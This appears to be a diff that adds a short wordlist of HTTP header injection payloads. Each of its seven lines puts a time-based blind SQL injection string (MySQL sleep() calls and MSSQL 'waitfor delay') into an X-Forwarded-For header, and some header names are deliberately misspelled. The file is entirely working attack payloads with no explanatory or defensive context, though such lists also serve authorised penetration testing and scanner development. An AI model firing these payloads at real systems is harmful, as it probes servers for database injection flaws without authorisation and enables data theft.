@@ -1,0 +1,7 @@
+X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(5),0))XOR'Z
+X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(4),0))XOR'Z
+X-Forwarded-For: 0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z
+X-Forwarded-For: 1;SELECT SLEEP(IF(RAND()>10,6,8))
+X-Fowarded-for : ' or sleep (6) -- '
+X-Forwarder-for : '; waitfor delay '00:00:06'
+X-Fowarded-for : '; waitfor delay "00\:01\:30" -- 
